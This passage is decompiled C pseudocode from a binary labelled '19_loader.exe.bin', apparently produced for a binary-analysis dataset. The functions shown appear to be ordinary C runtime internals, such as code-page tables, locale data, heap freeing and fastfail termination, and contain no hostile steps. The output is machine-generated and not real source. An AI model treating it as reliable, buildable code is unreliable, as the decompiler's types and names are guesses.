      if (DAT_1400e1160 == 0) goto LAB_14001777a;
      goto LAB_140017770;
    }
    FUN_1400225e0((undefined1 (*) [32])(param_2 + 0x18),0,0x101);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined8 *)(param_2 + 0x220) = 0;
    if (local_48.MaxCharSize == 2) {
      pBVar9 = local_48.LeadByte;
      bVar2 = local_48.LeadByte[0];
      while ((bVar2 != 0 && (pBVar9[1] != 0))) {
        bVar2 = *pBVar9;
        if ((uint)bVar2 <= (uint)pBVar9[1]) {
          uVar16 = (uint)bVar2;
          uVar10 = (ulonglong)(((uint)pBVar9[1] - (uint)bVar2) + 1);
          do {
            uVar16 = uVar16 + 1;
            pbVar6 = (byte *)((ulonglong)uVar16 + 0x18 + param_2);
            *pbVar6 = *pbVar6 | 4;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
        }
        pBVar9 = pBVar9 + 2;
        bVar2 = *pBVar9;
      }
      pbVar6 = (byte *)(param_2 + 0x1a);
      lVar8 = 0xfe;
      do {
        *pbVar6 = *pbVar6 | 8;
        pbVar6 = pbVar6 + 1;
        lVar8 = lVar8 + -1;
      } while (lVar8 != 0);
      iVar3 = *(int *)(param_2 + 4);
      if (iVar3 == 0x3a4) {
        pwVar7 = L"ja-JP";
      }
      else if (iVar3 == 0x3a8) {
        pwVar7 = L"zh-CN";
      }
      else if (iVar3 == 0x3b5) {
        pwVar7 = L"ko-KR";
      }
      else if (iVar3 == 0x3b6) {
        pwVar7 = L"zh-TW";
      }
      else {
        pwVar7 = (wchar_t *)0x0;
      }
      *(wchar_t **)(param_2 + 0x220) = pwVar7;
    }
    else {
      uVar13 = 0;
    }
    *(undefined4 *)(param_2 + 8) = uVar13;
  }
  puVar12 = (undefined2 *)(param_2 + 0xc);
  for (lVar8 = 6; lVar8 != 0; lVar8 = lVar8 + -1) {
    *puVar12 = 0;
    puVar12 = puVar12 + 1;
  }
LAB_140017766:
  FUN_140017be0(param_2);
  goto LAB_14001777a;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x177a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400177a0 rva=0x177a0 */

UINT FUN_1400177a0(UINT param_1)

{
  longlong local_28;
  longlong local_20;
  char local_10;
  
  FUN_14001743c(&local_28,(undefined4 *)0x0);
  DAT_1400e1160 = 0;
  if (param_1 == 0xfffffffe) {
    DAT_1400e1160 = 1;
    param_1 = GetOEMCP();
  }
  else if (param_1 == 0xfffffffd) {
    DAT_1400e1160 = 1;
    param_1 = GetACP();
  }
  else if (param_1 == 0xfffffffc) {
    DAT_1400e1160 = 1;
    param_1 = *(UINT *)(local_20 + 0xc);
  }
  if (local_10 != '\0') {
    *(uint *)(local_28 + 0x3a8) = *(uint *)(local_28 + 0x3a8) & 0xfffffffd;
  }
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17820 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017820 rva=0x17820 */

void FUN_140017820(longlong param_1)

{
  longlong lVar1;
  longlong lVar2;
  undefined2 *puVar3;
  longlong lVar4;
  
  FUN_1400225e0((undefined1 (*) [32])(param_1 + 0x18),0,0x101);
  lVar2 = 0;
  *(undefined8 *)(param_1 + 4) = 0;
  *(undefined8 *)(param_1 + 0x220) = 0;
  puVar3 = (undefined2 *)(param_1 + 0xc);
  for (lVar1 = 6; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  lVar1 = 0;
  do {
    lVar4 = lVar1 + 1;
    *(undefined1 *)(param_1 + lVar1 + 0x18) = (&DAT_1400dfcd8)[lVar1];
    lVar1 = lVar4;
  } while (lVar4 < 0x101);
  do {
    lVar1 = lVar2 + 1;
    *(undefined1 *)(param_1 + lVar2 + 0x119) = (&DAT_1400dfdd9)[lVar2];
    lVar2 = lVar1;
  } while (lVar1 < 0x100);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x178b8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400178b8 rva=0x178b8 */

int * FUN_1400178b8(longlong param_1,undefined8 *param_2)

{
  int iVar1;
  int *piVar2;
  
  if (((*(uint *)(param_1 + 0x3a8) & DAT_1400e0520) == 0) || (*(longlong *)(param_1 + 0x90) == 0)) {
    FUN_140016ab4(5);
    piVar2 = *(int **)(param_1 + 0x88);
    if (piVar2 != (int *)*param_2) {
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar2;
        *piVar2 = *piVar2 + -1;
        UNLOCK();
        if ((iVar1 == 1) && (piVar2 != (int *)&DAT_1400dfcc0)) {
          FUN_140017fb0(piVar2);
        }
      }
      piVar2 = (int *)*param_2;
      *(int **)(param_1 + 0x88) = piVar2;
      LOCK();
      *piVar2 = *piVar2 + 1;
      UNLOCK();
    }
    FUN_140016ad0(5);
  }
  else {
    piVar2 = *(int **)(param_1 + 0x88);
  }
  if (piVar2 == (int *)0x0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  return piVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17970 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017970 rva=0x17970 */

int FUN_140017970(UINT param_1,char param_2,longlong param_3,undefined8 *param_4)

{
  int iVar1;
  undefined8 uVar2;
  int *piVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  undefined8 *puVar7;
  UINT UVar8;
  int iVar9;
  undefined8 *puVar10;
  undefined8 *puVar11;
  undefined8 *puVar12;
  undefined8 *puVar13;
  longlong lVar14;
  longlong lVar15;
  longlong local_res18;
  undefined8 *local_res20;
  undefined1 local_268 [4];
  int local_264 [3];
  longlong *local_258;
  undefined8 **local_250;
  undefined8 local_248 [70];
  
  local_res18 = param_3;
  local_res20 = param_4;
  FUN_1400178b8(param_3,param_4);
  UVar8 = FUN_1400177a0(param_1);
  if (UVar8 == *(UINT *)(*(longlong *)(local_res18 + 0x88) + 4)) {
    iVar9 = 0;
  }
  else {
    puVar10 = FUN_140019a00(0x228);
    if (puVar10 == (undefined8 *)0x0) {
      FUN_140017fb0((LPVOID)0x0);
      iVar9 = -1;
    }
    else {
      lVar14 = 4;
      lVar15 = 4;
      puVar12 = *(undefined8 **)(local_res18 + 0x88);
      puVar7 = local_248;
      do {
        puVar13 = puVar7;
        puVar11 = puVar12;
        uVar2 = puVar11[1];
        uVar4 = puVar11[2];
        uVar5 = puVar11[3];
        *puVar13 = *puVar11;
        puVar13[1] = uVar2;
        uVar2 = puVar11[4];
        uVar6 = puVar11[5];
        puVar13[2] = uVar4;
        puVar13[3] = uVar5;
        uVar4 = puVar11[6];
        uVar5 = puVar11[7];
        puVar13[4] = uVar2;
        puVar13[5] = uVar6;
        uVar2 = puVar11[8];
        uVar6 = puVar11[9];
        puVar13[6] = uVar4;
        puVar13[7] = uVar5;
        uVar4 = puVar11[10];
        uVar5 = puVar11[0xb];
        puVar13[8] = uVar2;
        puVar13[9] = uVar6;
        uVar2 = puVar11[0xc];
        uVar6 = puVar11[0xd];
        puVar13[10] = uVar4;
        puVar13[0xb] = uVar5;
        uVar4 = puVar11[0xe];
        uVar5 = puVar11[0xf];
        puVar13[0xc] = uVar2;
        puVar13[0xd] = uVar6;
        puVar13[0xe] = uVar4;
        puVar13[0xf] = uVar5;
        lVar15 = lVar15 + -1;
        puVar12 = puVar11 + 0x10;
        puVar7 = puVar13 + 0x10;
      } while (lVar15 != 0);
      uVar4 = puVar11[0x11];
      uVar5 = puVar11[0x12];
      uVar6 = puVar11[0x13];
      uVar2 = puVar11[0x14];
      puVar13[0x10] = puVar11[0x10];
      puVar13[0x11] = uVar4;
      puVar13[0x12] = uVar5;
      puVar13[0x13] = uVar6;
      puVar13[0x14] = uVar2;
      puVar12 = local_248;
      puVar7 = puVar10;
      do {
        puVar13 = puVar7;
        puVar11 = puVar12;
        uVar2 = puVar11[1];
        uVar4 = puVar11[2];
        uVar5 = puVar11[3];
        *puVar13 = *puVar11;
        puVar13[1] = uVar2;
        uVar2 = puVar11[4];
        uVar6 = puVar11[5];
        puVar13[2] = uVar4;
        puVar13[3] = uVar5;
        uVar4 = puVar11[6];
        uVar5 = puVar11[7];
        puVar13[4] = uVar2;
        puVar13[5] = uVar6;
        uVar2 = puVar11[8];
        uVar6 = puVar11[9];
        puVar13[6] = uVar4;
        puVar13[7] = uVar5;
        uVar4 = puVar11[10];
        uVar5 = puVar11[0xb];
        puVar13[8] = uVar2;
        puVar13[9] = uVar6;
        uVar2 = puVar11[0xc];
        uVar6 = puVar11[0xd];
        puVar13[10] = uVar4;
        puVar13[0xb] = uVar5;
        uVar4 = puVar11[0xe];
        uVar5 = puVar11[0xf];
        puVar13[0xc] = uVar2;
        puVar13[0xd] = uVar6;
        puVar13[0xe] = uVar4;
        puVar13[0xf] = uVar5;
        lVar14 = lVar14 + -1;
        puVar12 = puVar11 + 0x10;
        puVar7 = puVar13 + 0x10;
      } while (lVar14 != 0);
      uVar4 = puVar11[0x11];
      uVar5 = puVar11[0x12];
      uVar6 = puVar11[0x13];
      uVar2 = puVar11[0x14];
      puVar13[0x10] = puVar11[0x10];
      puVar13[0x11] = uVar4;
      puVar13[0x12] = uVar5;
      puVar13[0x13] = uVar6;
      puVar13[0x14] = uVar2;
      *(undefined4 *)puVar10 = 0;
      iVar9 = FUN_1400174d8(UVar8,(longlong)puVar10);
      if (iVar9 == -1) {
        puVar12 = FUN_140018dec();
        *(undefined4 *)puVar12 = 0x16;
        FUN_140017fb0(puVar10);
        iVar9 = -1;
      }
      else {
        if (param_2 == '\0') {
          FUN_140015074();
        }
        piVar3 = *(int **)(local_res18 + 0x88);
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = *piVar3 + -1;
        UNLOCK();
        if ((iVar1 == 1) && (*(undefined **)(local_res18 + 0x88) != &DAT_1400dfcc0)) {
          FUN_140017fb0(*(undefined **)(local_res18 + 0x88));
        }
        *(undefined4 *)puVar10 = 1;
        *(undefined8 **)(local_res18 + 0x88) = puVar10;
        if ((DAT_1400e0520 & *(uint *)(local_res18 + 0x3a8)) == 0) {
          local_258 = &local_res18;
          local_250 = &local_res20;
          local_264[0] = 5;
          local_264[1] = 5;
          FUN_140017dd8(local_268,local_264 + 1,&local_258,local_264);
          if (param_2 != '\0') {
            PTR_DAT_1400e0360 = (undefined *)*local_res20;
          }
        }
        FUN_140017fb0((LPVOID)0x0);
      }
    }
  }
  return iVar9;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17be0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017be0 rva=0x17be0 */

void FUN_140017be0(longlong param_1)

{
  byte bVar1;
  byte bVar2;
  BOOL BVar3;
  uint uVar4;
  byte *pbVar5;
  CHAR *pCVar6;
  ulonglong uVar7;
  BYTE *pBVar8;
  WORD *pWVar9;
  longlong lVar10;
  undefined1 auStackY_788 [32];
  _cpinfo local_738;
  CHAR local_718 [231];
  byte abStack_631 [25];
  undefined1 local_618 [231];
  byte abStack_531 [25];
  undefined1 local_518 [256];
  WORD local_418 [512];
  ulonglong local_18;
  
  local_18 = DAT_1400dfc40 ^ (ulonglong)auStackY_788;
  local_738.LeadByte[10] = '\0';
  local_738.LeadByte[0xb] = '\0';
  local_738._18_2_ = 0;
  local_738.MaxCharSize = 0;
  local_738.DefaultChar[0] = '\0';
  local_738.DefaultChar[1] = '\0';
  local_738.LeadByte[0] = '\0';
  local_738.LeadByte[1] = '\0';
  local_738.LeadByte[2] = '\0';
  local_738.LeadByte[3] = '\0';
  local_738.LeadByte[4] = '\0';
  local_738.LeadByte[5] = '\0';
  local_738.LeadByte[6] = '\0';
  local_738.LeadByte[7] = '\0';
  local_738.LeadByte[8] = '\0';
  local_738.LeadByte[9] = '\0';
  if ((*(UINT *)(param_1 + 4) == 0xfde9) ||
     (BVar3 = GetCPInfo(*(UINT *)(param_1 + 4),&local_738), BVar3 == 0)) {
    uVar4 = 0;
    pbVar5 = (byte *)(param_1 + 0x19);
    do {
      if (uVar4 - 0x41 < 0x1a) {
        *pbVar5 = *pbVar5 | 0x10;
        bVar2 = (char)uVar4 + 0x20;
      }
      else if (uVar4 - 0x61 < 0x1a) {
        *pbVar5 = *pbVar5 | 0x20;
        bVar2 = (char)uVar4 - 0x20;
      }
      else {
        bVar2 = 0;
      }
      pbVar5[0x100] = bVar2;
      uVar4 = uVar4 + 1;
      pbVar5 = pbVar5 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    pCVar6 = local_718;
    lVar10 = 0x100;
    do {
      *pCVar6 = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
      pCVar6 = pCVar6 + 1;
    } while (uVar4 < 0x100);
    pBVar8 = local_738.LeadByte;
    local_718[0] = ' ';
    bVar2 = local_738.LeadByte[0];
    while (bVar2 != 0) {
      bVar1 = pBVar8[1];
      uVar7 = (ulonglong)bVar2;
      while ((uVar4 = (uint)uVar7, uVar4 <= bVar1 && (uVar4 < 0x100))) {
        local_718[uVar7] = ' ';
        uVar7 = (ulonglong)(uVar4 + 1);
      }
      pBVar8 = pBVar8 + 2;
      bVar2 = *pBVar8;
    }
    FUN_140019a94((undefined4 *)0x0,1,local_718,0x100,local_418,*(UINT *)(param_1 + 4),0);
    FUN_14001ccd8((undefined4 *)0x0,*(ushort **)(param_1 + 0x220),0x100,local_718,0x100,local_618,
                  0x100,*(UINT *)(param_1 + 4),0);
    FUN_14001ccd8((undefined4 *)0x0,*(ushort **)(param_1 + 0x220),0x200,local_718,0x100,local_518,
                  0x100,*(UINT *)(param_1 + 4),0);
    pWVar9 = local_418;
    pbVar5 = (byte *)(param_1 + 0x19);
    do {
      if ((*pWVar9 & 1) == 0) {
        if ((*pWVar9 & 2) == 0) {
          bVar2 = 0;
        }
        else {
          *pbVar5 = *pbVar5 | 0x20;
          bVar2 = pbVar5[(longlong)(abStack_531 + -param_1)];
        }
      }
      else {
        *pbVar5 = *pbVar5 | 0x10;
        bVar2 = pbVar5[(longlong)(abStack_631 + -param_1)];
      }
      pbVar5[0x100] = bVar2;
      pWVar9 = pWVar9 + 1;
      pbVar5 = pbVar5 + 1;
      lVar10 = lVar10 + -1;
    } while (lVar10 != 0);
  }
  FUN_14001a2d0(local_18 ^ (ulonglong)auStackY_788);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17dd8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017dd8 rva=0x17dd8 */

void FUN_140017dd8(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  int iVar1;
  int *piVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  undefined1 (*pauVar5) [32];
  undefined1 (*pauVar6) [32];
  longlong lVar7;
  
  FUN_140016ab4(*param_2);
  puVar4 = (undefined8 *)(*(longlong *)(*(longlong *)*param_3 + 0x88) + 0x18);
  if (DAT_1400e1148 == (undefined1 (*) [32])0x0) {
LAB_140017e8b:
    puVar4 = FUN_140018dec();
    *(undefined4 *)puVar4 = 0x16;
    FUN_1400180c4();
  }
  else {
    if (puVar4 == (undefined8 *)0x0) {
      FUN_1400225e0(DAT_1400e1148,0,0x101);
      goto LAB_140017e8b;
    }
    lVar7 = 2;
    pauVar6 = DAT_1400e1148;
    do {
      uVar3 = puVar4[1];
      *(undefined8 *)*pauVar6 = *puVar4;
      *(undefined8 *)(*pauVar6 + 8) = uVar3;
      uVar3 = puVar4[3];
      *(undefined8 *)(*pauVar6 + 0x10) = puVar4[2];
      *(undefined8 *)(*pauVar6 + 0x18) = uVar3;
      uVar3 = puVar4[5];
      *(undefined8 *)pauVar6[1] = puVar4[4];
      *(undefined8 *)(pauVar6[1] + 8) = uVar3;
      uVar3 = puVar4[7];
      *(undefined8 *)(pauVar6[1] + 0x10) = puVar4[6];
      *(undefined8 *)(pauVar6[1] + 0x18) = uVar3;
      uVar3 = puVar4[9];
      *(undefined8 *)pauVar6[2] = puVar4[8];
      *(undefined8 *)(pauVar6[2] + 8) = uVar3;
      uVar3 = puVar4[0xb];
      *(undefined8 *)(pauVar6[2] + 0x10) = puVar4[10];
      *(undefined8 *)(pauVar6[2] + 0x18) = uVar3;
      uVar3 = puVar4[0xd];
      *(undefined8 *)pauVar6[3] = puVar4[0xc];
      *(undefined8 *)(pauVar6[3] + 8) = uVar3;
      pauVar5 = pauVar6 + 4;
      uVar3 = puVar4[0xf];
      *(undefined8 *)(pauVar6[3] + 0x10) = puVar4[0xe];
      *(undefined8 *)(pauVar6[3] + 0x18) = uVar3;
      puVar4 = puVar4 + 0x10;
      lVar7 = lVar7 + -1;
      pauVar6 = pauVar5;
    } while (lVar7 != 0);
    (*pauVar5)[0] = *(undefined1 *)puVar4;
  }
  lVar7 = 2;
  puVar4 = (undefined8 *)(*(longlong *)(*(longlong *)*param_3 + 0x88) + 0x119);
  if (DAT_1400e1150 != (undefined1 (*) [32])0x0) {
    pauVar6 = DAT_1400e1150;
    if (puVar4 != (undefined8 *)0x0) {
      do {
        uVar3 = puVar4[1];
        *(undefined8 *)*pauVar6 = *puVar4;
        *(undefined8 *)(*pauVar6 + 8) = uVar3;
        uVar3 = puVar4[3];
        *(undefined8 *)(*pauVar6 + 0x10) = puVar4[2];
        *(undefined8 *)(*pauVar6 + 0x18) = uVar3;
        uVar3 = puVar4[5];
        *(undefined8 *)pauVar6[1] = puVar4[4];
        *(undefined8 *)(pauVar6[1] + 8) = uVar3;
        uVar3 = puVar4[7];
        *(undefined8 *)(pauVar6[1] + 0x10) = puVar4[6];
        *(undefined8 *)(pauVar6[1] + 0x18) = uVar3;
        uVar3 = puVar4[9];
        *(undefined8 *)pauVar6[2] = puVar4[8];
        *(undefined8 *)(pauVar6[2] + 8) = uVar3;
        uVar3 = puVar4[0xb];
        *(undefined8 *)(pauVar6[2] + 0x10) = puVar4[10];
        *(undefined8 *)(pauVar6[2] + 0x18) = uVar3;
        uVar3 = puVar4[0xd];
        *(undefined8 *)pauVar6[3] = puVar4[0xc];
        *(undefined8 *)(pauVar6[3] + 8) = uVar3;
        uVar3 = puVar4[0xf];
        *(undefined8 *)(pauVar6[3] + 0x10) = puVar4[0xe];
        *(undefined8 *)(pauVar6[3] + 0x18) = uVar3;
        puVar4 = puVar4 + 0x10;
        lVar7 = lVar7 + -1;
        pauVar6 = pauVar6 + 4;
      } while (lVar7 != 0);
      goto LAB_140017f3c;
    }
    FUN_1400225e0(DAT_1400e1150,0,0x100);
  }
  puVar4 = FUN_140018dec();
  *(undefined4 *)puVar4 = 0x16;
  FUN_1400180c4();
LAB_140017f3c:
  piVar2 = (int *)**(undefined8 **)param_3[1];
  LOCK();
  iVar1 = *piVar2;
  *piVar2 = *piVar2 + -1;
  UNLOCK();
  if ((iVar1 == 1) && ((undefined *)**(undefined8 **)param_3[1] != &DAT_1400dfcc0)) {
    FUN_140017fb0((LPVOID)**(undefined8 **)param_3[1]);
  }
  **(undefined8 **)param_3[1] = *(undefined8 *)(*(longlong *)*param_3 + 0x88);
  LOCK();
  **(int **)(*(longlong *)*param_3 + 0x88) = **(int **)(*(longlong *)*param_3 + 0x88) + 1;
  UNLOCK();
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x17fb0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140017fb0 rva=0x17fb0 */

void FUN_140017fb0(LPVOID param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  uint *puVar4;
  
  if ((param_1 != (LPVOID)0x0) && (BVar1 = HeapFree(DAT_1400e0d30,0,param_1), BVar1 == 0)) {
    DVar2 = GetLastError();
    uVar3 = FUN_140018e5c(DVar2);
    puVar4 = (uint *)FUN_140018dec();
    *puVar4 = uVar3;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18008 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018008 rva=0x18008 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_140018008(undefined8 *param_1,undefined8 *param_2)

{
  undefined8 *in_RAX;
  undefined8 *puVar1;
  
  if (param_1 != param_2) {
    puVar1 = param_1;
    do {
      in_RAX = (undefined8 *)0x0;
      if (((code *)*puVar1 != (code *)0x0) &&
         (in_RAX = (undefined8 *)(*(code *)*puVar1)(), (char)in_RAX == '\0')) break;
      puVar1 = puVar1 + 2;
    } while (puVar1 != param_2);
    if (puVar1 != param_2) {
      if (puVar1 != param_1) {
        puVar1 = puVar1 + -1;
        do {
          if ((puVar1[-1] != 0) && ((code *)*puVar1 != (code *)0x0)) {
            (*(code *)*puVar1)(0);
          }
          in_RAX = puVar1 + -1;
          puVar1 = puVar1 + -2;
        } while (in_RAX != param_1);
      }
      return (ulonglong)in_RAX & 0xffffffffffffff00;
    }
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18088 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018088 rva=0x18088 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_140018088(longlong param_1,longlong param_2)

{
  undefined8 in_RAX;
  
  for (; param_1 != param_2; param_2 = param_2 + -0x10) {
    in_RAX = 0;
    if (*(code **)(param_2 + -8) != (code *)0x0) {
      in_RAX = (**(code **)(param_2 + -8))(0);
    }
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x180c4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400180c4 rva=0x180c4 */

void FUN_1400180c4(void)

{
  FUN_14001847c(0,0,0,0,0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x180e4 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_1400180e4(void)

{
  code *pcVar1;
  BOOL BVar2;
  HANDLE hProcess;
  undefined1 *puVar3;
  undefined1 auStack_28 [8];
  undefined1 auStack_20 [32];
  
  BVar2 = IsProcessorFeaturePresent(0x17);
  puVar3 = auStack_28;
  if (BVar2 != 0) {
    pcVar1 = (code *)swi(0x29);
    (*pcVar1)(5);
    puVar3 = auStack_20;
  }
  *(undefined8 *)(puVar3 + -8) = 0x140018112;
  FUN_14001812c(2,0xc0000417,1);
  *(undefined8 *)(puVar3 + -8) = 0x140018118;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,0xc0000417);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1812c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001812c rva=0x1812c */

void FUN_14001812c(int param_1,DWORD param_2,DWORD param_3)

{
  BOOL BVar1;
  LONG LVar2;
  PRUNTIME_FUNCTION FunctionEntry;
  undefined1 auStackX_8 [8];
  undefined1 auStackY_608 [32];
  ulonglong local_5c8 [2];
  PVOID local_5b8;
  _EXCEPTION_POINTERS local_5b0;
  EXCEPTION_RECORD local_598;
  _CONTEXT local_4f8;
  ulonglong local_28;
  
  local_28 = DAT_1400dfc40 ^ (ulonglong)auStackY_608;
  if (param_1 != -1) {
    FUN_1400142e0();
  }
  FUN_1400225e0((undefined1 (*) [32])&local_598,0,0x98);
  FUN_1400225e0((undefined1 (*) [32])&local_4f8,0,0x4d0);
  local_5c8[1] = 0;
  local_5b0.ExceptionRecord = &local_598;
  local_5c8[0] = 0;
  local_5b8 = (PVOID)0x0;
  local_5b0.ContextRecord = &local_4f8;
  RtlCaptureContext(&local_4f8);
  FunctionEntry = RtlLookupFunctionEntry(local_4f8.Rip,local_5c8,(PUNWIND_HISTORY_TABLE)0x0);
  if (FunctionEntry != (PRUNTIME_FUNCTION)0x0) {
    RtlVirtualUnwind(0,local_5c8[0],local_4f8.Rip,FunctionEntry,&local_4f8,&local_5b8,local_5c8 + 1,
                     (PKNONVOLATILE_CONTEXT_POINTERS)0x0);
  }
  local_4f8.Rsp = (DWORD64)auStackX_8;
  local_598.ExceptionCode = param_2;
  local_598.ExceptionFlags = param_3;
  BVar1 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar2 = UnhandledExceptionFilter(&local_5b0);
  if (((LVar2 == 0) && (BVar1 == 0)) && (param_1 != -1)) {
    FUN_1400142e0();
  }
  FUN_14001a2d0(local_28 ^ (ulonglong)auStackY_608);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1829c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001829c rva=0x1829c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14001829c(undefined8 param_1)

{
  _DAT_1400e1168 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x182a4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400182a4 rva=0x182a4 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_1400182a4(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined4 param_4,
                  undefined8 param_5,longlong *param_6)

{
  undefined8 *puVar1;
  ulonglong *puVar2;
  byte bVar3;
  code *pcVar4;
  
  puVar1 = FUN_1400183c4(param_6);
  if ((puVar1 == (undefined8 *)0x0) || (pcVar4 = (code *)puVar1[0x77], pcVar4 == (code *)0x0)) {
    puVar2 = (ulonglong *)FUN_140018430(0x1400e1168,(longlong)param_6);
    bVar3 = (byte)DAT_1400dfc40 & 0x3f;
    pcVar4 = (code *)((*puVar2 ^ DAT_1400dfc40) >> bVar3 | (*puVar2 ^ DAT_1400dfc40) << 0x40 - bVar3
                     );
    if (pcVar4 == (code *)0x0) {
                    /* WARNING: Subroutine does not return */
      FUN_1400180e4();
    }
  }
  (*pcVar4)(param_1,param_2,param_3,param_4,param_5);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1835c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001835c rva=0x1835c */

longlong FUN_14001835c(longlong *param_1)

{
  undefined8 *puVar1;
  longlong lVar2;
  DWORD local_res8 [2];
  
  if (*param_1 == 0) {
    local_res8[0] = GetLastError();
    if ((char)param_1[2] == '\0') {
      param_1[1] = 0;
      lVar2 = 0;
      *(undefined1 *)(param_1 + 2) = 1;
    }
    else {
      lVar2 = param_1[1];
    }
    puVar1 = FUN_140016cb0(local_res8,lVar2);
    *param_1 = (longlong)puVar1;
    SetLastError(local_res8[0]);
    if (puVar1 == (undefined8 *)0x0) {
                    /* WARNING: Subroutine does not return */
      FUN_1400160f8();
    }
  }
  return *param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x183c4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400183c4 rva=0x183c4 */

undefined8 * FUN_1400183c4(longlong *param_1)

{
  undefined8 *puVar1;
  longlong lVar2;
  DWORD local_res8 [2];
  
  puVar1 = (undefined8 *)*param_1;
  lVar2 = 0;
  if (puVar1 == (undefined8 *)0x0) {
    local_res8[0] = GetLastError();
    if ((char)param_1[2] == '\0') {
      param_1[1] = 0;
      *(undefined1 *)(param_1 + 2) = 1;
    }
    else {
      lVar2 = param_1[1];
    }
    puVar1 = FUN_140016cb0(local_res8,lVar2);
    *param_1 = (longlong)puVar1;
    SetLastError(local_res8[0]);
  }
  return puVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18430 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018430 rva=0x18430 */

longlong FUN_140018430(longlong param_1,longlong param_2)

{
  DWORD dwErrCode;
  longlong lVar1;
  
  lVar1 = 0;
  if (*(char *)(param_2 + 0x10) == '\0') {
    dwErrCode = GetLastError();
    *(undefined8 *)(param_2 + 8) = 0;
    *(undefined1 *)(param_2 + 0x10) = 1;
    SetLastError(dwErrCode);
  }
  else {
    lVar1 = *(longlong *)(param_2 + 8);
  }
  return param_1 + lVar1 * 8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1847c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001847c rva=0x1847c */

void FUN_14001847c(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined4 param_4,
                  undefined8 param_5)

{
  longlong lVar1;
  longlong local_48 [2];
  undefined1 local_38;
  undefined *local_30;
  undefined *puStack_28;
  char local_20;
  undefined4 local_1c;
  char local_18;
  undefined4 local_14;
  char local_10;
  
  local_48[0] = 0;
  local_20 = DAT_1400e07f8 == 0;
  local_38 = 0;
  local_18 = '\0';
  local_10 = '\0';
  if ((bool)local_20) {
    local_30 = PTR_PTR_1400e0358;
    puStack_28 = PTR_DAT_1400e0360;
  }
  FUN_1400182a4(param_1,param_2,param_3,param_4,param_5,local_48);
  if (local_20 == '\x02') {
    *(uint *)(local_48[0] + 0x3a8) = *(uint *)(local_48[0] + 0x3a8) & 0xfffffffd;
  }
  if (local_18 != '\0') {
    lVar1 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar1 + 0x20) = local_1c;
  }
  if (local_10 != '\0') {
    lVar1 = FUN_14001835c(local_48);
    *(undefined4 *)(lVar1 + 0x24) = local_14;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x18520 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140018520 rva=0x18520 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

bool FUN_140018520(undefined8 param_1)

{
  int iVar1;
